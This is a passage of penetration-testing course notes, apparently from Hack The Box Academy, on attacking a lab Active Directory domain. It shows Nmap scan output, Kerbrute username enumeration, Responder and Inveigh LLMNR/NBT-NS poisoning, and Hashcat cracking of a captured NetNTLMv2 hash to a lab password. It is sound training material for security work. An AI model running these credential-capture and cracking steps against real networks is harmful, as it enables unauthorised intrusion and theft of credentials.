6.1.7600\nHost script results:\n| smb2-security-mode: \n|   2.1: \n|_    Message signing enabled but not required\n| ms-sql-info: \n|   172.16.5.100:1433: \n|     Version: \n|       name: Microsoft SQL Server 2008 R2 RTM\n|       number: 10.50.1600.00\n|       Product: Microsoft SQL Server 2008 R2\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n|_nbstat: NetBIOS name: ACADEMY-EA-CTX1, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c7:1c (VMware)\n| smb-os-discovery: \n|   OS: Windows Server 2008 R2 Standard 7600 (Windows Server 2008 R2 Standard 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_server_2008::-\n|   Computer name: ACADEMY-EA-CTX1\n|   NetBIOS computer name: ACADEMY-EA-CTX1\\x00\n|   Domain name: INLANEFREIGHT.LOCAL\n|   Forest name: INLANEFREIGHT.LOCAL\n|   FQDN: ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL\n|_  System time: 2022-04-08T10:43:48-07:00\n\n<SNIP>\n```\n\nWe can see from the output above that we have a potential host running an outdated operating system ( Windows 7, 8, or Server 2008 based on the output). This is of interest to us since it means there are legacy operating systems running in this AD environment. It also means there is potential for older exploits like EternalBlue, MS08-067, and others to work and provide us with a SYSTEM level shell. As weird as it sounds to have hosts running legacy software or end-of-life operating systems, it is still common in large enterprise environments. You will often have some process or equipment such as a production line or the HVAC built on the older OS and has been in place for a long time. Taking equipment like that offline is costly and can hurt an organization, so legacy hosts are often left in place. They will likely try to build a hard outer shell of Firewalls, IDS/IPS, and other monitoring and protection solutions around those systems. If you can find your way into one, it is a big deal and can be a quick and easy foothold. Before exploiting legacy systems, however, we should alert our client and get their approval in writing in case an attack results in system instability or brings a service or the host down. They may prefer that we just observe, report, and move on without actively exploiting the system.\n\nThe results of these scans will clue us into where we will start looking for potential domain enumeration avenues, not just host scanning. We need to find our way to a domain user account. Looking at our results, we found several servers that host domain services ( DC01, MX01, WS01, etc.). Now that we know what exists and what services are running, we can poll those servers and attempt to enumerate users. Be sure to use the `-oA` flag as a best practice when performing Nmap scans. This will ensure that we have our scan results in several formats for logging purposes and formats that can be manipulated and fed into other tools.\n\nWe need to be aware of what scans we run and how they work. Some of the Nmap scripted scans run active vulnerability checks against a host that could cause system instability or take it offline, causing issues for the customer or worse. For example, running a large discovery scan against a network with devices such as sensors or logic controllers could potentially overload them and disrupt the customer's industrial equipment causing a loss of product or capability. Take the time to understand the scans you use before running them in a customer's environment.\n\nWe will most likely return to these results later for further enumeration, so don't forget about them. We need to find our way to a domain user account or `SYSTEM` level access on a domain-joined host so we can gain a foothold and start the real fun. Let's dive into finding a user account.\n\n---\n\n## Identifying Users\n\nIf our client does not provide us with a user to start testing with (which is often the case), we will need to find a way to establish a foothold in the domain by either obtaining clear text credentials or an NTLM password hash for a user, a SYSTEM shell on a domain-joined host, or a shell in the context of a domain user account. Obtaining a valid user with credentials is critical in the early stages of an internal penetration test. This access (even at the lowest level) opens up many opportunities to perform enumeration and even attacks. Let's look at one way we can start gathering a list of valid users in a domain to use later in our assessment.\n\n### Kerbrute - Internal AD Username Enumeration\n\n[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the `jsmith.txt` or `jsmith2.txt` user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective. We can point Kerbrute at the DC we found earlier and feed it a wordlist. The tool is quick, and we will be provided with results letting us know if the accounts found are valid or not, which is a great starting point for launching attacks such as password spraying, which we will cover in-depth later in this module.\n\nTo get started with Kerbrute, we can download [precompiled binaries](https://github.com/ropnop/kerbrute/releases/latest) for the tool for testing from Linux, Windows, and Mac, or we can compile it ourselves. This is generally the best practice for any tool we introduce into a client environment. To compile the binaries to use on the system of our choosing, we first clone the repo:\n\n#### Cloning Kerbrute GitHub Repo\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git\n\nCloning into 'kerbrute'...\nremote: Enumerating objects: 845, done.\nremote: Counting objects: 100% (47/47), done.\nremote: Compressing objects: 100% (36/36), done.\nremote: Total 845 (delta 18), reused 28 (delta 10), pack-reused 798\nReceiving objects: 100% (845/845), 419.70 KiB | 2.72 MiB/s, done.\nResolving deltas: 100% (371/371), done.\n```\n\nTyping `make help` will show us the compiling options available.\n\n#### Listing Compiling Options\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ make help\n\nhelp:            Show this help.\nwindows:  Make Windows x86 and x64 Binaries\nlinux:  Make Linux x86 and x64 Binaries\nmac:  Make Darwin (Mac) x86 and x64 Binaries\nclean:  Delete any binaries\nall:  Make Windows, Linux and Mac x86/x64 Binaries\n```\n\nWe can choose to compile just one binary or type `make all` and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).\n\n#### Compiling for Multiple Platforms and Architectures\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo make all\n\ngo: downloading github.com/spf13/cobra v1.1.1\ngo: downloading github.com/op/go-logging v0.0.0-20160315200505-970db520ece7\ngo: downloading github.com/ropnop/gokrb5/v8 v8.0.0-20201111231119-729746023c02\ngo: downloading github.com/spf13/pflag v1.0.5\ngo: downloading github.com/jcmturner/gofork v1.0.0\ngo: downloading github.com/hashicorp/go-uuid v1.0.2\ngo: downloading golang.org/x/crypto v0.0.0-20201016220609-9e8e0b390897\ngo: downloading github.com/jcmturner/rpc/v2 v2.0.2\ngo: downloading github.com/jcmturner/dnsutils/v2 v2.0.0\ngo: downloading github.com/jcmturner/aescts/v2 v2.0.0\ngo: downloading golang.org/x/net v0.0.0-20200114155413-6afb5195e5aa\ncd /tmp/kerbrute\nrm -f kerbrute kerbrute.exe kerbrute kerbrute.exe kerbrute.test kerbrute.test.exe kerbrute.test kerbrute.test.exe main main.exe\nrm -f /root/go/bin/kerbrute\nDone.\nBuilding for windows amd64..\n\n<SNIP>\n```\n\nThe newly created `dist` directory will contain our compiled binaries.\n\n#### Listing the Compiled Binaries in dist\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls dist/\n\nkerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe\n```\n\nWe can then test out the binary to make sure it works properly. We will be using the x64 version on the supplied Parrot Linux attack host in the target environment.\n\n#### Testing the kerbrute_linux_amd64 Binary\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./kerbrute_linux_amd64 \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop\n\nThis tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.\nIt is designed to be used on an internal Windows domain with access to one of the Domain Controllers.\nWarning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts\n\nUsage:\n  kerbrute [command]\n  \n  <SNIP>\n```\n\nWe can add the tool to our PATH to make it easily accessible from anywhere on the host.\n\n#### Adding the Tool to our Path\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ echo $PATH\n/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools\n```\n\n#### Moving the Binary\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute\n```\n\nWe can now type `kerbrute` from any location on the system and will be able to access the tool. Feel free to follow along on your system and practice the above steps. Now let's run through an example of using the tool to gather an initial username list.\n\n#### Enumerating Users with Kerbrute\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n\n2021/11/17 23:01:46 >  Using KDC(s):\n2021/11/17 23:01:46 >   172.16.5.5:88\n2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL\n2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL\n2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL\n2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL\n\n <SNIP>\n \n2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL\n2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL\n2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL\n2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL\n2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL\n2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL\n2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds\n```\n\nWe can see from our output that we validated 56 users in the INLANEFREIGHT.LOCAL domain and it took only a few seconds to do so. Now we can take these results and build a list for use in targeted password spraying attacks.\n\n---\n\n## Identifying Potential Vulnerabilities\n\nThe [local system](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account `NT AUTHORITY\\SYSTEM` is a built-in account in Windows operating systems. It has the highest level of access in the OS and is used to run most Windows services. It is also very common for third-party services to run in the context of this account by default. A `SYSTEM` account on a `domain-joined` host will be able to enumerate Active Directory by impersonating the computer account, which is essentially just another kind of user account. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account.\n\nThere are several ways to gain SYSTEM-level access on a host, including but not limited to:\n\n- Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.\n- Abusing a service running in the context of the `SYSTEM account`, or abusing the service account `SeImpersonate` privileges using [Juicy Potato](https://github.com/ohpe/juicy-potato). This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.\n- Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.\n- Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window\n\nBy gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:\n\n- Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.\n- Perform Kerberoasting / ASREPRoasting attacks within the same domain.\n- Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.\n- Perform token impersonation to hijack a privileged domain user account.\n- Carry out ACL attacks.\n\n---\n\n## A Word Of Caution\n\nKeep the scope and style of the test in mind when choosing a tool for use. If you are performing a non-evasive penetration test, with everything out in the open and the customer's staff knowing you are there, it doesn't typically matter how much noise you make. However, during an evasive penetration test, adversarial assessment, or red team engagement, you are trying to mimic a potential attacker's Tools, Tactics, and Procedures. With that in mind, `stealth` is of concern. Throwing Nmap at an entire network is not exactly quiet, and many of the tools we commonly use on a penetration test will trigger alarms for an educated and prepared SOC or Blue Teamer. Always be sure to clarify the goal of your assessment with the client in writing before it begins.\n\n---\n\n## Let's Find a User\n\nIn the following few sections, we will hunt for a domain user account using techniques such as LLMNR/NBT-NS Poisoning and password spraying. These attacks are great ways to gain a foothold but must be exercised with caution and an understanding of the tools and techniques. Now let's hunt down a user account so we can move on to the next phase of our assessment and start picking apart the domain piece by piece and digging deep for a multitude of misconfigurations and flaws.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/07-LLMNR & NBT-NS Poisoning - from Linux",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/07-LLMNR & NBT-NS Poisoning - from Linux.md",
    "title": "07 LLMNR & NBT NS Poisoning   From Linux",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- At this point, we have completed our initial enumeration of the domain. We obtained some basic user and group information, enumerated hosts while looking for critical services and roles like a Dom...",
    "category": "02_CPTS",
    "content": "\n---\n\nAt this point, we have completed our initial enumeration of the domain. We obtained some basic user and group information, enumerated hosts while looking for critical services and roles like a Domain Controller, and figured out some specifics such as the naming scheme used for the domain. In this phase, we will work through two different techniques side-by-side: network poisoning and password spraying. We will perform these actions with the goal of acquiring valid cleartext credentials for a domain user account, thereby granting us a foothold in the domain to begin the next phase of enumeration from a credentialed standpoint.\n\nThis section and the next will cover a common way to gather credentials and gain an initial foothold during an assessment: a Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. Though not covered in this module, these hashes can also sometimes be used to perform an SMB Relay attack to authenticate to a host or multiple hosts in the domain with administrative privileges without having to crack the password hash offline. Let's dive in!\n\n---\n\n## LLMNR & NBT-NS Primer\n\n[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063\\(v=technet.10\\)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.\n\nThe kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with `Responder` to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.\n\n---\n\n## Quick Example - LLMNR/NBT-NS Poisoning\n\nLet's walk through a quick example of the attack flow at a very high level:\n\n1. A host attempts to connect to the print server at \\\\print01.inlanefreight.local, but accidentally types in \\\\printer01.inlanefreight.local.\n2. The DNS server responds, stating that this host is unknown.\n3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\\\printer01.inlanefreight.local.\n4. The attacker (us with `Responder` running) responds to the host stating that it is the \\\\printer01.inlanefreight.local that the host is looking for.\n5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.\n6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.\n\n---\n\n## TTPs\n\nWe are performing these actions to collect authentication information sent over the network in the form of NTLMv1 and NTLMv2 password hashes. As discussed in the [Introduction to Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) module, NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash. We will then take the hash and attempt to crack them offline using tools such as [Hashcat](https://hashcat.net/hashcat/) or [John](https://www.openwall.com/john/) with the goal of obtaining the account's cleartext password to be used to gain an initial foothold or expand our access within the domain if we capture a password hash for an account with more privileges than an account that we currently possess.\n\nSeveral tools can be used to attempt LLMNR & NBT-NS poisoning:\n\n|**Tool**|**Description**|\n|---|---|\n|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|\n|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|\n|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|\n\nThis section and the following one will show examples of using Responder and Inveigh to capture password hashes and attempt to crack them offline. We commonly start an internal penetration test from an anonymous position on the client's internal network with a Linux attack host. Tools such as Responder are great for establishing a foothold that we can later expand upon through further enumeration and attacks. Responder is written in Python and typically used on a Linux attack host, though there is a .exe version that works on Windows. Inveigh is written in both C# and PowerShell (considered legacy). Both tools can be used to attack the following protocols:\n\n- LLMNR\n- DNS\n- MDNS\n- NBNS\n- DHCP\n- ICMP\n- HTTP\n- HTTPS\n- SMB\n- LDAP\n- WebDAV\n- Proxy Auth\n\nResponder also has support for:\n\n- MSSQL\n- DCE-RPC\n- FTP, POP3, IMAP, and SMTP auth\n\n---\n\n### Responder In Action\n\nResponder is a relatively straightforward tool, but is extremely powerful and has many different functions. In the `Initial Enumeration` section earlier, we utilized Responder in Analysis (passive) mode. This means it listened for any resolution requests, but did not answer them or send out poisoned packets. We were acting like a fly on the wall, just listening. Now, we will take things a step further and let Responder do what it does best. Let's look at some options available by typing `responder -h` into our console.\n\nLLMNR/NBT-NS Poisoning - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ responder -h\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.0.6.0\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\nUsage: responder -I eth0 -w -r -f\nor:\nresponder -I eth0 -wrf\n\nOptions:\n  --version             show program's version number and exit\n  -h, --help            show this help message and exit\n  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,\n                        BROWSER, LLMNR requests without responding.\n  -I eth0, --interface=eth0\n                        Network interface to use, you can use 'ALL' as a\n                        wildcard for all interfaces\n  -i 10.0.0.21, --ip=10.0.0.21\n                        Local IP to use (only for OSX)\n  -e 10.0.0.22, --externalip=10.0.0.22\n                        Poison all requests with another IP address than\n                        Responder's one.\n  -b, --basic           Return a Basic HTTP authentication. Default: NTLM\n  -r, --wredir          Enable answers for netbios wredir suffix queries.\n                        Answering to wredir will likely break stuff on the\n                        network. Default: False\n  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.\n                        Answering to domain suffixes will likely break stuff\n                        on the network. Default: False\n  -f, --fingerprint     This option allows you to fingerprint a host that\n                        issued an NBT-NS or LLMNR query.\n  -w, --wpad            Start the WPAD rogue proxy server. Default value is\n                        False\n  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY\n                        Upstream HTTP proxy used by the rogue WPAD Proxy for\n                        outgoing requests (format: host:port)\n  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file\n                        retrieval. This may cause a login prompt. Default:\n                        False\n  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)\n                        authentication for the proxy. WPAD doesn't need to be\n                        ON. This option is highly effective when combined with\n                        -r. Default: False\n  --lm                  Force LM hashing downgrade for Windows XP/2003 and\n                        earlier. Default: False\n  -v, --verbose         Increase verbosity.\n```\n\nAs shown earlier in the module, the `-A` flag puts us into analyze mode, allowing us to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses. We must always supply either an interface or an IP. Some common options we'll typically want to use are `-wf`; this will start the WPAD rogue proxy server, while `-f` will attempt to fingerprint the remote host operating system and version. We can use the `-v` flag for increased verbosity if we are running into issues, but this will lead to a lot of additional data printed to the console. Other options such as `-F` and `-P` can be used to force NTLM or Basic authentication and force proxy authentication, but may cause a login prompt, so they should be used sparingly. The use of the `-w` flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has [Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) enabled.\n\nWith this configuration shown above, Responder will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the `/usr/share/responder/logs` directory. Hashes are saved in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`, and one hash is printed to the console and stored in its associated log file unless `-v` mode is enabled. For example, a log file may look like `SMB-NTLMv2-SSP-172.16.5.25`. Hashes are also stored in a SQLite database that can be configured in the `Responder.conf` config file, typically located in `/usr/share/responder` unless we clone the Responder repo directly from GitHub.\n\nWe must run the tool with sudo privileges or as root and make sure the following ports are available on our attack host for it to function best:\n\nLLMNR/NBT-NS Poisoning - from Linux\n\n```shell-session\n\nUDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353\n```\n\nAny of the rogue servers (i.e., SMB) can be disabled in the `Responder.conf` file.\n\n#### Responder Logs\n\nLLMNR/NBT-NS Poisoning - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls\n\nAnalyzer-Session.log                Responder-Session.log\nConfig-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt\nHTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt\nPoisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txt\nProxy-Auth-NTLMv2-172.16.5.200.txt\n```\n\nIf Responder successfully captured hashes, as seen above, we can find the hashes associated with each host/protocol in their own text file. The animation below shows us an example of Responder running and capturing hashes on the network.\n\nWe can kick off a Responder session rather quickly:\n\n#### Starting Responder with Default Settings\n\nCode: bash\n\n```bash\nsudo responder -I ens224 \n```\n\n#### Capturing with Responder\n\n![GIF showcasing the capture of an authentication requests in responder on the ens224 interface.](https://academy.hackthebox.com/storage/modules/143/responder_hashes.png)\n\nTypically we should start Responder and let it run for a while in a tmux window while we perform other enumeration tasks to maximize the number of hashes that we can obtain. Once we are ready, we can pass these hashes to Hashcat using hash mode `5600` for NTLMv2 hashes that we typically obtain with Responder. We may at times obtain NTLMv1 hashes and other types of hashes and can consult the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page to identify them and find the proper hash mode. If we ever obtain a strange or unknown hash, this site is a great reference to help identify it. Check out the [Cracking Passwords With Hashcat](https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat) module for an in-depth study of Hashcat's various modes and how to attack a wide variety of hash types.\n\nOnce we have enough, we need to get these hashes into a usable format for us right now. NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash, meaning we have to attempt to crack them offline. We can do this with tools such as Hashcat and John.\n\n#### Cracking an NTLMv2 Hash With Hashcat\n\nLLMNR/NBT-NS Poisoning - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n<SNIP>\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\nFOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: NetNTLMv2\nHash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...000000\nTime.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)\nTime.Estimated...: Mon Feb 28 15:20:41 2022 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  1086.9 kH/s (2.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 10967040/14344385 (76.46%)\nRejected.........: 0/10967040 (0.00%)\nRestore.Point....: 10960896/14344385 (76.41%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: L0VEABLE -> Kittikat\n\nStarted: Mon Feb 28 15:20:29 2022\nStopped: Mon Feb 28 15:20:42 2022\n```\n\nLooking at the results above, we can see we cracked the NET-NTLMv2 hash for user `FOREND`, whose password is `Klmcargo2`. Lucky for us our target domain allows weak 8-character passwords. This hash type can be \"slow\" to crack even on a GPU cracking rig, so large and complex passwords may be more difficult or impossible to crack within a reasonable amount of time.\n\n---\n\n## Moving On\n\nAt this point in our assessment, we have obtained and cracked one NetNTLMv2 hash for the user `FOREND`. We can use this as a foothold into the domain to begin further enumeration. It is best to collect as much data as possible during an assessment, so we should attempt to crack as many hashes as we can (provided our later enumeration shows the value in cracking them to further our access). We don't want to waste precious assessment time attempting to crack hashes for users that will not help us move further toward our goal. Before we move into other ways to obtain a foothold via password spraying, let's walk through a similar method for obtaining hashes from a Windows host using the Inveigh tool.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/08-LLMNR & NBT-NS Poisoning - from Windows",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/08-LLMNR & NBT-NS Poisoning - from Windows.md",
    "title": "08 LLMNR & NBT NS Poisoning   From Windows",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- LLMNR & NBT-NS poisoning is possible from a Windows host as well. In the last section, we utilized Responder to capture hashes. This section will explore the tool Inveigh and attempt to capture an...",
    "category": "02_CPTS",
    "content": "\n---\n\nLLMNR & NBT-NS poisoning is possible from a Windows host as well. In the last section, we utilized Responder to capture hashes. This section will explore the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) and attempt to capture another set of credentials.\n\n---\n\n## Inveigh - Overview\n\nIf we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth. The tool is available in the `C:\\Tools` directory on the provided Windows attack host.\n\nWe can get started with the PowerShell version as follows and then list all possible parameters. There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.\n\n## Using Inveigh\n\nLLMNR/NBT-NS Poisoning - from Windows\n\n```powershell-session\nPS C:\\htb> Import-Module .\\Inveigh.ps1\nPS C:\\htb> (Get-Command Invoke-Inveigh).Parameters\n\nKey                     Value\n---                     -----\nADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata\nKerberosHostHeader      System.Management.Automation.ParameterMetadata\nProxyIgnore             System.Management.Automation.ParameterMetadata\nPcapTCP                 System.Management.Automation.ParameterMetadata\nPcapUDP                 System.Management.Automation.ParameterMetadata\nSpooferHostsReply       System.Management.Automation.ParameterMetadata\nSpooferHostsIgnore      System.Management.Automation.ParameterMetadata\nSpooferIPsReply         System.Management.Automation.ParameterMetadata\nSpooferIPsIgnore        System.Management.Automation.ParameterMetadata\nWPADDirectHosts         System.Management.Automation.ParameterMetadata\nWPADAuthIgnore          System.Management.Automation.ParameterMetadata\nConsoleQueueLimit       System.Management.Automation.ParameterMetadata\nConsoleStatus           System.Management.Automation.ParameterMetadata\nADIDNSThreshold         System.Management.Automation.ParameterMetadata\nADIDNSTTL               System.Management.Automation.ParameterMetadata\nDNSTTL                  System.Management.Automation.ParameterMetadata\nHTTPPort                System.Management.Automation.ParameterMetadata\nHTTPSPort               System.Management.Automation.ParameterMetadata\nKerberosCount           System.Management.Automation.ParameterMetadata\nLLMNRTTL                System.Management.Automation.ParameterMetadata\n\n<SNIP>\n```\n\nLet's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help).\n\nLLMNR/NBT-NS Poisoning - from Windows\n\n```powershell-session\nPS C:\\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n\n[*] Inveigh 1.506 started at 2022-02-28T19:26:30\n[+] Elevated Privilege Mode = Enabled\n[+] Primary IP Address = 172.16.5.25\n[+] Spoofer IP Address = 172.16.5.25\n[+] ADIDNS Spoofer = Disabled\n[+] DNS Spoofer = Enabled\n[+] DNS TTL = 30 Seconds\n[+] LLMNR Spoofer = Enabled\n[+] LLMNR TTL = 30 Seconds\n[+] mDNS Spoofer = 